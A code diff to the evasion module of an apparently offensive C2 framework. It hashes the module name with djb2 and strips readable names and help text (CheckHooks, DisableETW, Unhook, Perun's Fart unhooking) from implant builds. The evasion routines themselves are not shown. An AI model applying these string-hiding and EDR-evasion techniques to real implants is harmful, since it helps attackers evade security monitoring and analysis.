@@ -11,10 +11,13 @@
 #include "structs.hpp"
 #endif
 
+#include "Common.hpp"
+
 
 using namespace std;
 
-const std::string moduleName = "evasion";
+constexpr std::string_view moduleName = "evasion";
+constexpr unsigned long moduleHash = djb2(moduleName);
 
 
 #ifdef _WIN32
@@ -34,7 +37,11 @@ int disableETW(void);
 
 
 Evasion::Evasion()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -45,14 +52,14 @@ Evasion::~Evasion()
 std::string Evasion::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "evasion:\n";
-
 	info += "exemple:\n";
 	info += "- evasion CheckHooks (ntdll, kernelbase, kernel32)\n";
 	info += "- evasion DisableETW\n";
 	info += "- evasion Unhook (ntdll, kernelbase, kernel32)\n";
 	info += "- evasion UnhookPerunsFart (ntdll)\n";
-
+#endif
 	return info;
 }
 
@@ -101,7 +108,7 @@ int Evasion::process(C2Message &c2Message, C2Message &c2RetMessage)
 		
 #endif
 
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_cmd("");
 	c2RetMessage.set_returnvalue(result);
 
